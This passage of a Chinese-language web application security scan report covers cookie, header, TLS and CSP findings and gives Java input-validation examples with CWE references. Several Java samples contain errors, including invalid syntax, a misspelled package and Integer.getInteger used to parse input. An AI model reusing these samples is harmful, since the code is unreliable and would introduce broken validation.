</div><div></div><div>此外，我們建議您使用 HttpOnly 旗標。當 HttpOnly 旗標設為 TRUE 時，只能透過 HTTP 通訊協定來存取 Cookie。這表示無法用 JavaScript 之類的 Scripting 語言存取 Cookie。這個設定有助於實際減少透過 XSS 攻擊來盜用身分的情況（不過，並非所有瀏覽器都支援）。</div><div></div><div>PHP 5.2.0 新增 HttpOnly 旗標。</div><div></div><div>參照</div><div></div><div>[1] 利用「HTTP 專用 Cookie」緩和「跨網站指令碼」： </div><a href="http://msdn2.microsoft.com/en-us/library/ms533046.aspx">http://msdn2.microsoft.com/en-us/library/ms533046.aspx</a><br /><div>[2] PHP 安全聯盟： </div><a href="http://phpsec.org/">http://phpsec.org/</a><br /><div>[3] PHP &amp; Web 應用程式安全部落格 (Chris Shiflett)： </div><a href="http://shiflett.org/">http://shiflett.org/</a><br /></ul></div><div class="noPageBreak" xmlns=""><h4>CWE：</h4><a href="http://cwe.mitre.org/data/definitions/22.html">22</a><br /><a href="http://cwe.mitre.org/data/definitions/23.html">23</a><br /><a href="http://cwe.mitre.org/data/definitions/20.html">20</a><br /><a href="http://cwe.mitre.org/data/definitions/200.html">200</a><br /></div><div class="noPageBreak" xmlns=""><h4>外部參照：</h4><a href="http://phrack.org/issues.html?issue=55&amp;id=7#article">Phrack 文章：Perl CGI 問題</a><br /><a href="http://www.w3.org/Security/">W3 安全常見問題 (FAQ)</a><br /><a href="http://www.cert.org/advisories/CA-1997-25.html">CERT 諮詢 (CA-1997-25)：消毒 CGI Script 中使用者提供的資料</a><br /></div><div class="h2group" id="VulnerableComponent" xmlns=""><h2>有弱點的元件</h2><a name="VulnerableComponent_Adv"></a><a class="toclink" href="#toc">目錄</a></div><div class="noPageBreak" xmlns=""><h4>原因：</h4><ul style="&#xA;              list-style: none; padding-left: 0; margin-top:0;&#xA;            "><li>測試應用程式中使用了一個有弱點的元件。</li></ul></div><div class="noPageBreak" xmlns=""><h4>風險：</h4><ul style="&#xA;              list-style: none; padding-left: 0; margin-top:0;&#xA;            "><div>有弱點的元件可能導致應用程式出現各種弱點</div></ul></div><div class="noPageBreak" xmlns=""><h4>修正建議：</h4><h5>一般</h5><ul style="&#xA;              list-style: none; padding-left: 0; margin-top:0;&#xA;            "><div>升級到該組件的最新版本。如果該組件已達到其生命終結（EOL），請用最近支持的替代品替換該組件。我們強烈建議聯繫該產品的供應商，看看是否最近有補丁或修復可用。</div></ul></div><div class="noPageBreak" xmlns=""><h4>CWE：</h4><a href="http://cwe.mitre.org/data/definitions/1395.html">1395</a><br /></div><div class="noPageBreak" xmlns=""><h4>外部參照：</h4><a href="http://www.cert.org">CERT 協調中心</a><br /><a href="https://www.cve.org">常見弱點和暴露 (CVE)</a><br /></div><div class="h2group" id="attDirectoryFound" xmlns=""><h2>偵測到隱藏目錄</h2><a name="attDirectoryFound_Adv"></a><a class="toclink" href="#toc">目錄</a></div><div class="noPageBreak" xmlns=""><h4>原因：</h4><ul style="&#xA;              list-style: none; padding-left: 0; margin-top:0;&#xA;            "><li>已使用不安全的方式配置 Web 伺服器或應用程式伺服器</li></ul></div><div class="noPageBreak" xmlns=""><h4>風險：</h4><ul style="padding-left: 1.2em; margin-top:0"><div>有可能擷取網站檔案系統結構的相關資訊，其可能會幫助攻擊者對映網站</div><div>Web 應用程式顯現了網站中的目錄。</div><div>雖然目錄並沒有列出它的內容，但這個資訊可以協助攻擊者對網站展開進一步的攻擊。</div><div>例如，知道目錄名稱之後，攻擊者便可以猜測它的內容類型，也許還能猜出其中的檔名或其下的子目錄，並嘗試存取它們。</div><div>內容的機密性愈高，這個問題也愈嚴重。</div></ul></div><div class="noPageBreak" xmlns=""><h4>受影響的產品：</h4><ul style="&#xA;							list-style: none; padding-left: 0; margin-top:0;&#xA;						"><div>這個問題可能會影響不同類型的產品。</div></ul></div><div class="noPageBreak" xmlns=""><h4>修正建議：</h4><h5>一般</h5><ul style="&#xA;              list-style: none; padding-left: 0; margin-top:0;&#xA;            "><div>如果不需要禁止的資源，請將它從網站中移除。</div><div>可能的話，請發出「404 - 找不到」回應狀態碼，而不是「403 - 禁止」。</div><div>這項變更會將網站的目錄模糊化，可以防止洩漏網站結構。</div></ul></div><div class="noPageBreak" xmlns=""><h4>CWE：</h4><a href="http://cwe.mitre.org/data/definitions/200.html">200</a><br /><a href="http://cwe.mitre.org/data/definitions/497.html">497</a><br /></div><div class="h2group" id="attRespCookieNotHttpOnlySessionCookie" xmlns=""><h2>在階段作業 Cookie 中遺漏 HttpOnly 屬性</h2><a name="attRespCookieNotHttpOnlySessionCookie_Adv"></a><a class="toclink" href="#toc">目錄</a></div><div class="noPageBreak" xmlns=""><h4>原因：</h4><ul style="&#xA;              list-style: none; padding-left: 0; margin-top:0;&#xA;            "><li>Web 應用程式設定的階段作業 Cookie 不含 HttpOnly 屬性</li></ul></div><div class="noPageBreak" xmlns=""><h4>風險：</h4><ul style="padding-left: 1.2em; margin-top:0"><div>有可能竊取或操作客戶階段作業和 Cookie，其可能用來假冒合法的使用者，讓駭客可以檢視或變更使用者記錄，以及以該使用者的身分來執行交易</div><div>在應用程式測試期間，偵測到所測試的 Web 應用程式設定了不含 "HttpOnly" 屬性的階段作業 Cookie。由於這個階段作業 Cookie 不含 "HttpOnly" 屬性，因此其可由注入網站的惡意 Script 來存取，值也可能被竊取。儲存在階段作業記號中的任何資訊都可能被竊取，之後再用來盜用身分或模擬使用者。</div></ul></div><div class="noPageBreak" xmlns=""><h4>受影響的產品：</h4><ul style="&#xA;							list-style: none; padding-left: 0; margin-top:0;&#xA;						"><div>這個問題可能會影響不同類型的產品</div></ul></div><div class="noPageBreak" xmlns=""><h4>修正建議：</h4><h5>一般</h5><ul style="&#xA;              list-style: none; padding-left: 0; margin-top:0;&#xA;            "><div>基本上，Cookie 的唯一必要屬性是 "name" 欄位。</div><div>常見的選用屬性如下："comment"、"domain"、"path" 等等。</div><div>"HttpOnly" 屬性必須相應地設定，才能防止 Script 存取階段作業 Cookie。</div></ul></div><div class="noPageBreak" xmlns=""><h4>CWE：</h4><a href="http://cwe.mitre.org/data/definitions/653.html">653</a><br /><a href="http://cwe.mitre.org/data/definitions/693.html">693</a><br /><a href="http://cwe.mitre.org/data/definitions/1004.html">1004</a><br /></div><div class="h2group" id="attUnnecessaryResponseHeaders" xmlns=""><h2>應用程式中找到不必要的 HTTP 回應標頭</h2><a name="attUnnecessaryResponseHeaders_Adv"></a><a class="toclink" href="#toc">目錄</a></div><div class="noPageBreak" xmlns=""><h4>原因：</h4><ul style="&#xA;              list-style: none; padding-left: 0; margin-top:0;&#xA;            "><li>不安全的 Web 應用程式設計或配置</li></ul></div><div class="noPageBreak" xmlns=""><h4>風險：</h4><ul style="padding-left: 1.2em; margin-top:0"><div>可以收集關於 Web 伺服器類型、版本、作業系統等機密資訊。</div><div>AppScan 偵測到不必要的 Http 回應標頭。</div><div>基於安全性和隱私考量，"Server"、"X-Powered-By"、"X-AspNetMvc-Version" 和 "X-AspNet-Version" 等 Http 回應標頭不應顯示在網頁中。</div><div>每當由伺服器向用戶端傳送回應時，預設通常會新增 "Server" 標頭。</div><div>每當由伺服器向用戶端傳送回應時，預設可能會新增 "X-Powered-By" 標頭。</div><div>這些新增的標頭可能會顯示與內部伺服器軟體版本與類型相關的機密資訊，讓攻擊者將其複製，並透過目標惡意探索進行攻擊。此外，當新的惡意探索為人所知時，伺服器最有可能會遭到其攻擊。</div></ul></div><div class="noPageBreak" xmlns=""><h4>受影響的產品：</h4><ul style="&#xA;							list-style: none; padding-left: 0; margin-top:0;&#xA;						"><div>此問題可能會影響各種類型的產品。</div></ul></div><div class="noPageBreak" xmlns=""><h4>修正建議：</h4><h5>一般</h5><ul style="&#xA;              list-style: none; padding-left: 0; margin-top:0;&#xA;            "><div>設定您的伺服器，以避免預設的 "Server" 標頭傳送至所有傳出要求。</div><div>若為 IIS，請參閱：</div><div>https://techcommunity.microsoft.com/t5/iis-support-blog/remove-unwanted-http-response-headers/ba-p/369710</div><div>若為 nginx，請參閱： </div><div>https://www.getpagespeed.com/server-setup/nginx/how-to-remove-the-server-header-in-nginx</div><div>若為 Weblogic，請參閱：</div><div>https://docs.oracle.com/cd/E13222_01/wls/docs81/adminguide/web_server.html</div><div>若為 Apache，請參閱： </div><div>https://techglimpse.com/set-modify-response-headers-http-tip/</div></ul></div><div class="noPageBreak" xmlns=""><h4>CWE：</h4><a href="http://cwe.mitre.org/data/definitions/200.html">200</a><br /><a href="http://cwe.mitre.org/data/definitions/668.html">668</a><br /><a href="http://cwe.mitre.org/data/definitions/497.html">497</a><br /></div><div class="noPageBreak" xmlns=""><h4>外部參照：</h4><a href="http://projects.webappsec.org/w/page/13246925/Fingerprinting">產生指紋</a><br /><a href="https://www.hacksplaining.com/prevention/information-leakage">避免資訊洩漏</a><br /></div><div class="h2group" id="attNoHttpsRedirection" xmlns=""><h2>缺少加密</h2><a name="attNoHttpsRedirection_Adv"></a><a class="toclink" href="#toc">目錄</a></div><div class="noPageBreak" xmlns=""><h4>原因：</h4><ul style="padding-left: 1.2em; margin-top:0"><li>應用程式未使用 TLS/SSL 這類安全通道來交換機密性資訊。</li><li>具有網路資料流量存取權的攻擊者可以透過連線來竊聽封包。此攻擊在技術上並不難，但確實需要實體存取網路中機密資料所經過的某個部分。</li></ul></div><div class="noPageBreak" xmlns=""><h4>風險：</h4><ul style="padding-left: 1.2em; margin-top:0"><div>任何以明碼形式傳送至伺服器的資訊都可能透過網路進行竊取，並在稍後用於身分竊取或使用者模擬。</div><div>可能可以截取到以未加密形式傳送的機密資料，例如 使用者登入資訊（使用者名稱和密碼）、信用卡號碼、社會保險號碼等。</div><div>可能可以執行攔截式 (MitM) 攻擊，讓攻擊者完全控制通訊，包括變更內容、竊取資料，或向伺服器模擬使用者。</div></ul></div><div class="noPageBreak" xmlns=""><h4>修正建議：</h4><h5>一般</h5><ul style="&#xA;              list-style: none; padding-left: 0; margin-top:0;&#xA;            "><div>您應該一律只透過 TLS/SSL 連線來傳輸所有資料。這包括所有外部通訊，例如瀏覽器、資料庫這類後端連線、第三方 API 及其他服務。</div><div>此外，還有數個隱私規範指出一律會將使用者認證這類機密性資訊以加密形式傳送至網站。</div><div>一律強制使用加密連線（例如 TLS/SSL），而且不容許使用未加密 HTTP 對機密性資訊進行任何存取。</div><div>使用 TLS 1.2 或 TLS 1.3，以及使用高度加密雜湊演算法和密碼組合。</div></ul></div><div class="noPageBreak" xmlns=""><h4>CWE：</h4><a href="http://cwe.mitre.org/data/definitions/311.html">311</a><br /><a href="http://cwe.mitre.org/data/definitions/319.html">319</a><br /><a href="http://cwe.mitre.org/data/definitions/359.html">359</a><br /></div><div class="noPageBreak" xmlns=""><h4>外部參照：</h4><a href="https://cheatsheetseries.owasp.org/cheatsheets/TLS_Cipher_String_Cheat_Sheet.html">OWASP - TLS 密碼字串速查表</a><br /><a href="https://cheatsheetseries.owasp.org/cheatsheets/Transport_Layer_Protection_Cheat_Sheet.html">OWASP - 傳輸層保護速查表</a><br /></div><div class="h2group" id="attContentSecurityPolicy" xmlns=""><h2>遺漏「Content-Security-Policy」標頭</h2><a name="attContentSecurityPolicy_Adv"></a><a class="toclink" href="#toc">目錄</a></div><div class="noPageBreak" xmlns=""><h4>原因：</h4><ul style="&#xA;              list-style: none; padding-left: 0; margin-top:0;&#xA;            "><li>不安全的 Web 應用程式設計或配置</li></ul></div><div class="noPageBreak" xmlns=""><h4>風險：</h4><ul style="padding-left: 1.2em; margin-top:0"><div>有可能收集 Web 應用程式相關的機密性資訊，如：使用者名稱、密碼、機器名稱及/或機密檔案位置</div><div>有可能讓無經驗而易受騙的使用者信以為真而提供機密資訊，例如：使用者名稱、密碼、信用卡號碼、社會保險號碼等等</div><div>缺少 CSP 或設定不適當的值，可能會導致 Web 應用程式遭受 XSS、點擊劫持等攻擊。</div><div>「Content-Security-Policy」標頭的目的在於修改瀏覽器呈現頁面的方式，進而預防各種跨網站注入攻擊，包括跨網站 跨網站指令碼。請務必設定正確的標頭值，避免網站運作不良。例如，如果將標頭設定為禁止執行行內 JavaScript，網站就不能在頁面中使用行內 JavaScript。</div><div>為了抵禦跨網站指令碼、跨框架 Scripting 及點擊劫持，請務必設定以下原則並提供適當的值：</div><div>「default-src」和「frame-ancestors」原則兩者，*或*「script-src」、「object-src」及「frame-ancestors」原則三者。</div><div>對於「default-src」、「script-src」及「object-src」，請避免「*」、「data:」、「unsafe-inline」或「unsafe-eval」這類不安全的值。</div><div>對於「frame-ancestors」，請避免「*」或「data:」這類不安全的值。</div><div>此外，對於「script-src」和「default-src」（「script-src」的後援指引），一般認為「self」是不安全的，應避免使用。</div><div>如需詳細資訊，請參考以下鏈結。</div><div>請注意，「Content-Security-Policy」包含四個不同的測試。有個一般測試會驗證「Content-Security-Policy」標頭是否正在使用中，其他三個測試會檢查「Frame-Ancestors」、「Object-Src」和「Script-Src」是否正確設定。</div></ul></div><div class="noPageBreak" xmlns=""><h4>受影響的產品：</h4><ul style="&#xA;							list-style: none; padding-left: 0; margin-top:0;&#xA;						"><div>此問題可能會影響不同類型的產品</div></ul></div><div class="noPageBreak" xmlns=""><h4>修正建議：</h4><h5>一般</h5><ul style="&#xA;              list-style: none; padding-left: 0; margin-top:0;&#xA;            "><div>設定您的伺服器以傳送「Content-Security-Policy」標頭。</div><div>建議您將 Content-Security-Policy 標頭設定為其指引的安全值，如下所示：</div><div>對於「default-src」和「script-src」，安全值包括「none」或 https://any.example.com。</div><div>對於「frame-ancestors」和「object-src」，預期的安全值包括「self」、「none」或 https://any.example.com 等。</div><div>「unsafe-inline」和「unsafe-eval」絕不能使用。使用暫時 / 雜湊只能是短期替代方案。</div><div>若為 Apache 伺服器，請參閱：</div><div>http://httpd.apache.org/docs/2.2/mod/mod_headers.html</div><div>若為 IIS 伺服器，請參閱：</div><div>https://technet.microsoft.com/pl-pl/library/cc753133%28v=ws.10%29.aspx</div><div>若為 nginx 伺服器，請參閱：</div><div>http://nginx.org/en/docs/http/ngx_http_headers_module.html</div></ul></div><div class="noPageBreak" xmlns=""><h4>CWE：</h4><a href="http://cwe.mitre.org/data/definitions/1032.html">1032</a><br /><a href="http://cwe.mitre.org/data/definitions/79.html">79</a><br /><a href="http://cwe.mitre.org/data/definitions/693.html">693</a><br /><a href="http://cwe.mitre.org/data/definitions/830.html">830</a><br /><a href="http://cwe.mitre.org/data/definitions/1021.html">1021</a><br /></div><div class="noPageBreak" xmlns=""><h4>外部參照：</h4><a href="https://owasp.org/www-project-secure-headers/">幾個安全的標頭清單</a><br /><a href="http://www.html5rocks.com/en/tutorials/security/content-security-policy/">「內容安全原則 (Content Security Policy)」的簡介</a><br /><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy">MDN web docs - Content-Security-Policy</a><br /></div><div class="h2group" id="ContentTypeOptions" xmlns=""><h2>遺漏或不安全的 "X-Content-Type-Options" 標頭</h2><a name="ContentTypeOptions_Adv"></a><a class="toclink" href="#toc">目錄</a></div><div class="noPageBreak" xmlns=""><h4>原因：</h4><ul style="&#xA;              list-style: none; padding-left: 0; margin-top:0;&#xA;            "><li>不安全的 Web 應用程式設計或配置</li></ul></div><div class="noPageBreak" xmlns=""><h4>風險：</h4><ul style="padding-left: 1.2em; margin-top:0"><div>有可能收集 Web 應用程式相關的機密性資訊，如：使用者名稱、密碼、機器名稱及/或機密檔案位置</div><div>有可能說服無經驗而易受騙的使用者提供機密性資訊，如：使用者名稱、密碼、信用卡號碼、社會保險號碼等等</div><div>具有 "nosniff" 值的 "X-Content-Type-Options" 標頭可防止 IE 和 Chrome 忽視回應的內容類型。</div><div>此動作可防止使用者的瀏覽器（例如在惡意命名後）執行未受信任的內容（例如使用者上傳的內容）。</div></ul></div><div class="noPageBreak" xmlns=""><h4>受影響的產品：</h4><ul style="&#xA;							list-style: none; padding-left: 0; margin-top:0;&#xA;						"><div>此問題可能會影響不同類型的產品</div></ul></div><div class="noPageBreak" xmlns=""><h4>修正建議：</h4><h5>一般</h5><ul style="&#xA;              list-style: none; padding-left: 0; margin-top:0;&#xA;            "><div>配置您的伺服器，在所有送出的要求上使用值為 "nosniff" 的 "X-Content-Type-Options" 標頭。</div><div></div><div>若為 Apache 伺服器，請參閱：</div><a href="http://httpd.apache.org/docs/2.2/mod/mod_headers.html">http://httpd.apache.org/docs/2.2/mod/mod_headers.html</a><br /><div>若為 IIS 伺服器，請參閱：</div><a href="https://technet.microsoft.com/pl-pl/library/cc753133%28v=ws.10%29.aspx">https://technet.microsoft.com/pl-pl/library/cc753133%28v=ws.10%29.aspx</a><br /><div>若為 nginx 伺服器，請參閱：</div><a href="http://nginx.org/en/docs/http/ngx_http_headers_module.html">http://nginx.org/en/docs/http/ngx_http_headers_module.html</a><br /></ul></div><div class="noPageBreak" xmlns=""><h4>CWE：</h4><a href="http://cwe.mitre.org/data/definitions/200.html">200</a><br /><a href="http://cwe.mitre.org/data/definitions/693.html">693</a><br /></div><div class="noPageBreak" xmlns=""><h4>外部參照：</h4><a href="https://www.owasp.org/index.php/List_of_useful_HTTP_headers">有用的 HTTP 標頭清單</a><br /><a href="https://msdn.microsoft.com/en-us/library/gg622941%28v=vs.85%29.aspx">減少 MIME 類型的安全風險</a><br /></div><div class="h2group" id="attUndefinedState" xmlns=""><h2>應用程式錯誤</h2><a name="attUndefinedState_Adv"></a><a class="toclink" href="#toc">目錄</a></div><div class="noPageBreak" xmlns=""><h4>原因：</h4><ul style="padding-left: 1.2em; margin-top:0"><li>未對送入的參數值執行適當的範圍檢查</li><li>未執行驗證，以確定使用者輸入符合預期的資料類型</li></ul></div><div class="noPageBreak" xmlns=""><h4>風險：</h4><ul style="padding-left: 1.2em; margin-top:0"><div>有可能收集機密性除錯資訊</div><div>如果攻擊者偽造含有非應用程式所預期的參數或參數值（範例如下）來探測應用程式，應用程式可能會陷入容易遭到攻擊的未定義狀態。</div><div>攻擊者可以從應用程式對這項要求的回應中，取得有用的資訊；這項資訊可能會遭到不當運用，從而找出應用程式的弱點。</div><div>比方說，如果參數欄位應該是單引號括住的字串（例如：在 ASP Script 或 SQL 查詢中），</div><div>注入的單引號會提早終止字串串流，從而變更 Script 的正常流程/語法。</div><div>錯誤訊息顯露重要資訊的另一個原因，是 Scripting 引擎、Web 伺服器或資料庫配置錯誤。以下是一些不同的變式：</div><div>[1] 移除參數</div><div>[2] 移除參數值</div><div>[3] 將參數值設為空值</div><div>[4] 將參數值設為數值溢位 (+/- 99999999)</div><div>[5] 將參數值設為 ' " \' \" ) ; 之類的危險字元</div><div>[6] 將某字串附加到數值參數值</div><div>[7] 將 "."（句號）或 "[]"（角括弧）附加至參數名稱</div></ul></div><div class="noPageBreak" xmlns=""><h4>受影響的產品：</h4><ul style="&#xA;							list-style: none; padding-left: 0; margin-top:0;&#xA;						"><div>這個問題可能會影響不同類型的產品。</div></ul></div><div class="noPageBreak" xmlns=""><h4>修正建議：</h4><h5>一般</h5><ul style="&#xA;              list-style: none; padding-left: 0; margin-top:0;&#xA;            "><div>[1] 檢查送入要求，以瞭解所有預期的參數和值是否存在。</div><div>當遺漏參數時，便發出適當的錯誤訊息，或使用預設值。</div><div>[2] 應用程式應該驗證它的輸入是否由有效字元組成（解碼之後）。</div><div>例如，含有空值位元組的輸入值（編碼為 %00）、單引號、引號等，都應該予以拒絕。</div><div>[3] 施行符合預期範圍和類型的值。</div><div>如果您的應用程式預期特定參數有特定值集中的值，應用程式應該確定它接收的值確實屬於這個值集。比方說，如果您的應用程式預期 10..99 範圍內的值，它應該確定值確實是數值，且在 10..99 範圍內。</div><div>[4] 確認資料屬於提供給用戶端的資料集。</div><div>[5] 不在正式作業環境中，輸出除錯錯誤訊息和異常狀況。</div><div>如果要在 ASP.NET 中停用除錯，請編輯您的 web.config 檔，使它含有下列內容：</div><div>&lt;compilation</div><div>debug="false"</div><div>/&gt;</div><div></div><div>如需相關資訊，請參閱「如何：停用 ASP.NET 應用程式除錯」，位置如下：</div><a href="http://support.microsoft.com/default.aspx?scid=kb;en-us;815157">http://support.microsoft.com/default.aspx?scid=kb;en-us;815157</a><br /><div></div><div>您可以利用驗證控制項，將輸入驗證新增到「Web 表單」頁面中。</div><div>驗證控制項提供適用於標準驗證之所有一般類型的簡易使用機制（例如：測試日期是否有效，或值是否在範圍內），以及用來提供自訂編寫驗證的方式。此外，驗證控制項也可讓您完整自訂向使用者顯示錯誤資訊的方式。驗證控制項可以搭配「Web 表單」頁面類別檔所處理的任何控制項來使用，其中包括 HTML 和 Web 伺服器控制項。</div><div></div><div>如果要確定要求含有所有必要的參數，請使用 "RequiredFieldValidator" 驗證控制項。</div><div>這個控制項可確保使用者未跳過 Web 表單中的任何項目。如果要確定使用者輸入只包含有效值，您可以使用下列其中一個驗證控制項：</div><div></div><div>[1] "RangeValidator"：檢查使用者的輸入（值）是否在指定的上下界限之間。您可以檢查數字、英文字母和日期之配對內的範圍。[2] "RegularExpressionValidator"：檢查輸入是否符合正規表示式所定義的型樣。這類型的驗證可讓您檢查可預期的字元序列，例如：社會保險號碼、電子郵件位址、電話號碼、郵遞區號等等中的字元序列。</div><div></div><div>重要注意事項：驗證控制項不會封鎖使用者輸入，或變更頁面處理流程；它們只會設定錯誤狀態，以及產生錯誤訊息。在執行進一步的應用程式專屬動作之前，程式設計師負責測試程式碼中的控制項狀態。</div><div></div><div>檢查使用者輸入有效性有兩種方式：</div><div></div><div>1. 測試一般錯誤狀態：</div><div></div><div>在您的程式碼中，測試頁面的 IsValid 內容。</div><div>這個內容會累積頁面上所有驗證控制項的 IsValid 內容值（使用邏輯 AND）。如果其中一個驗證控制項設為無效，頁面內容便會傳回 False。</div><div></div><div>2. 測試個別控制項的錯誤狀態：</div><div></div><div>在迴圈中處理頁面的驗證器集合，集合中含有指向所有驗證控制項的參照。</div><div>之後，您便可以檢查每個驗證控制項的 IsValid 內容。</div><div>** 驗證輸入資料：</div><div></div><div>雖然為了使用者的方便，可以在用戶端層提供資料驗證，但必須利用 Servlet，在伺服器層執行資料驗證。</div><div>用戶端驗證原本就不安全，因為它們可以輕易略過，例如：停用 JavaScript。</div><div></div><div>好的設計通常需要 Web 應用程式架構提供伺服器端公用程式常式來驗證下列項目：</div><div>[1] 必要欄位</div><div>[2] 欄位資料類型（依預設，所有 HTTP 要求參數都是 String）</div><div>[3] 欄位長度</div><div>[4] 欄位範圍</div><div>[5] 欄位選項</div><div>[6] 欄位型樣</div><div>[7] Cookie 值</div><div>[8] HTTP 回應</div><div></div><div>在實務中，好的做法是在 "Validator" 公用程式類別中將上述常式當作靜態方法來實作。下列各節說明範例驗證器類別</div><div></div><div>[1] 必要欄位</div><div>一律檢查確認欄位不是空值，欄位長度大於零，且不含在前端及尾端的空格。</div><div></div><div>如何驗證必要欄位的範例：</div><div></div><div>  // Java example to validate required fields
  public Class Validator {
      ...
      public static boolean validateRequired(String value) {
          boolean isFieldValid = false;
          if (value != null &amp;&amp; value.trim().length() &gt; 0) {
              isFieldValid = true;
          }
          return isFieldValid;
      }
      ...
  }
  ...
  String fieldValue = request.getParameter("fieldName");
  if (Validator.validateRequired(fieldValue)) {
      // fieldValue is valid, continue processing request
      ...
  }
</div><div></div><div>[2] 欄位資料類型</div><div>在 Web 應用程式中，所輸入的輸入參數設定不良。例如，所有 HTTP 要求參數或 Cookie 值都是 String 類型。開發人員負責確認輸入的資料類型正確。</div><div></div><div>請利用 Java 基本封套類別來檢查欄位值是否能安全轉換成所需要的基本資料類型。</div><div></div><div>如何驗證數值欄位（int 類型）的範例：</div><div></div><div>  // Java example to validate that a field is an int number
  public Class Validator {
      ...
      public static boolean validateInt(String value) {
          boolean isFieldValid = false;
          try {
              Integer.parseInt(value);
              isFieldValid = true;
          } catch (Exception e) {
              isFieldValid = false;
          }
          return isFieldValid;
      }
      ...
  }
  ...
  // check if the HTTP request parameter is of type int
  String fieldValue = request.getParameter("fieldName");
  if (Validator.validateInt(fieldValue)) {
      // fieldValue is valid, continue processing request
      ...
  }
</div><div></div><div>在實務中，好的做法是將所有 HTTP 要求參數轉換成它們的相關資料類型。例如，將要求參數的 "integerValue" 儲存在要求屬性中，再依照下列範例所示來使用它：</div><div></div><div>  // Example to convert the HTTP request parameter to a primitive wrapper data type
  // and store this value in a request attribute for further processing
  String fieldValue = request.getParameter("fieldName");
  if (Validator.validateInt(fieldValue)) {
      // convert fieldValue to an Integer
      Integer integerValue = Integer.getInteger(fieldValue);
      // store integerValue in a request attribute
      request.setAttribute("fieldName", integerValue);
  }
  ...
  // Use the request attribute for further processing
  Integer integerValue = (Integer)request.getAttribute("fieldName");
  ...
</div><div></div><div>應用程式應該處理的主要 Java 資料類型：</div><div>- Byte</div><div>- Short</div><div>- Integer</div><div>- Long</div><div>- Float</div><div>- Double</div><div>- Date</div><div></div><div>[3] 欄位長度</div><div>一律確定輸入參數（HTTP 要求參數或 Cookie 值）在長度下限及/或長度上限的範圍內。</div><div></div><div>驗證 userName 欄位的長度是否在 8-20 個字元之間的範例：</div><div></div><div>  // Example to validate the field length
  public Class Validator {
      ...
      public static boolean validateLength(String value, int minLength, int maxLength) {
          String validatedValue = value;
          if (!validateRequired(value)) {
              validatedValue = "";
          }
          return (validatedValue.length() &gt;= minLength &amp;&amp;
                      validatedValue.length() &lt;= maxLength);
      }
      ...
  }
  ...
  String userName = request.getParameter("userName");
  if (Validator.validateRequired(userName)) {
      if (Validator.validateLength(userName, 8, 20)) {
          // userName is valid, continue further processing
          ...
      }
  }
</div><div></div><div>[4] 欄位範圍</div><div>一律確定輸入參數在函數需求定義的範圍內。驗證輸入 numberOfChoices 是否在 10-20 之間的範例：</div><div></div><div>  // Example to validate the field range
  public Class Validator {
      ...
      public static boolean validateRange(int value, int min, int max) {
          return (value &gt;= min &amp;&amp; value &lt;= max);
      }
      ...
  }
  ...
  String fieldValue = request.getParameter("numberOfChoices");
  if (Validator.validateRequired(fieldValue)) {
      if (Validator.validateInt(fieldValue)) {
          int numberOfChoices = Integer.parseInt(fieldValue);
          if (Validator.validateRange(numberOfChoices, 10, 20)) {
              // numberOfChoices is valid, continue processing request
              ...
          }
      }
  }
</div><div></div><div>[5] 欄位選項</div><div>Web 應用程式通常會向使用者呈現一組可供選擇的選項（例如：使用 SELECT HTML 標籤），但無法執行伺服器端驗證來確保所選的值是容許的選項之一。請記住，惡意的使用者可以輕易修改任何選項值。一律檢查使用者輸入是否符合功能需求所定義的型樣。</div><div>對照容許的選項清單來驗證使用者選項的範例：</div><div></div><div>  // Example to validate user selection against a list of options
  public Class Validator {
      ...
      public static boolean validateOption(Object[] options, Object value) {
          boolean isValidValue = false;
          try {
              List list = Arrays.asList(options);
              if (list != null) {
                  isValidValue = list.contains(value);
              }
          } catch (Exception e) {
          }
          return isValidValue;
      }
      ...
  }
  ...
  // Allowed options
  String[] options = {"option1", "option2", "option3");
  // Verify that the user selection is one of the allowed options
  String userSelection = request.getParameter("userSelection");
  if (Validator.validateOption(options, userSelection)) {
      // valid user selection, continue processing request
      ...
  }
</div><div></div><div>[6] 欄位型樣</div><div>一律檢查使用者輸入是否符合功能需求所定義的型樣。比方說，如果 userName 欄位只應接受英數字元，且不區分大小寫，請使用下列正規表示式：</div><div>^[a-zA-Z0-9]*$</div><div></div><div>Java 1.3 或更早的版本不包括任何正規表示式套件。建議搭配 Java 1.3 來使用「Apache 正規表示式套件」（請參閱下列「資源」），以解決這項支援欠缺。</div><div>執行正規表示式驗證的範例：</div><div></div><div>  // Example to validate that a given value matches a specified pattern
  // using the Apache regular expression package
  import org.apache.regexp.RE;
  import org.apache.regexp.RESyntaxException;
  public Class Validator {
      ...
      public static boolean matchPattern(String value, String expression) {
          boolean match = false;
          if (validateRequired(expression)) {
               RE r = new RE(expression);
               match = r.match(value);             
          }
          return match;
      }
      ...
  }
  ...
  // Verify that the userName request parameter is alpha-numeric
  String userName = request.getParameter("userName");
  if (Validator.matchPattern(userName, "^[a-zA-Z0-9]*$")) {
      // userName is valid, continue processing request
      ...
  }
</div><div></div><div>Java 1.4 引進了新的正規表示式套件 (java.util.regex)。以下是 Validator.matchPattern 的修正版，使用新的 Java 1.4 正規表示式套件：</div><div></div><div>  // Example to validate that a given value matches a specified pattern
  // using the Java 1.4 regular expression package
  import java.util.regex.Pattern;
  import java.util.regexe.Matcher;
  public Class Validator {
      ...
      public static boolean matchPattern(String value, String expression) {
          boolean match = false;
          if (validateRequired(expression)) {
              match = Pattern.matches(expression, value);
          }
          return match;
      }
      ...
  }
</div><div></div><div>[7] Cookie 值</div><div>請利用 javax.servlet.http.Cookie 物件來驗證 Cookie 值。依應用程式需求而定，相同的驗證規則（說明如上）也適用於 Cookie 值，例如：驗證必要的值、驗證長度，等等。</div><div></div><div>驗證必要 Cookie 值的範例：</div><div></div><div>  // Example to validate a required cookie value
  // First retrieve all available cookies submitted in the HTTP request
  Cookie[] cookies = request.getCookies();
  if (cookies != null) {
      // find the "user" cookie
      for (int i=0; i&lt;cookies.length; ++i) {
          if (cookies[i].getName().equals("user")) {
              // validate the cookie value
              if (Validator.validateRequired(cookies[i].getValue()) {
                  // valid cookie value, continue processing request
                  ...
              }
          }    
      }
  }
</div><div></div><div>[8] HTTP 回應</div><div>[8-1] 過濾使用者輸入</div><div>如果要保護應用程式免於遭受跨網站指令碼，請將機密字元轉換成對應的字元實體來消毒 HTML。以下是 HTML 區分字元：</div><div>&lt; &gt; " ' % ; ) ( &amp; +</div><div></div><div>將機密字元轉換成對應的字元實體來過濾指定字串的範例：</div><div></div><div>  // Example to filter sensitive data to prevent cross-site scripting
  public Class Validator {
      ...
      public static String filter(String value) {
          if (value == null) {
              return null;
          }        
          StringBuffer result = new StringBuffer(value.length());
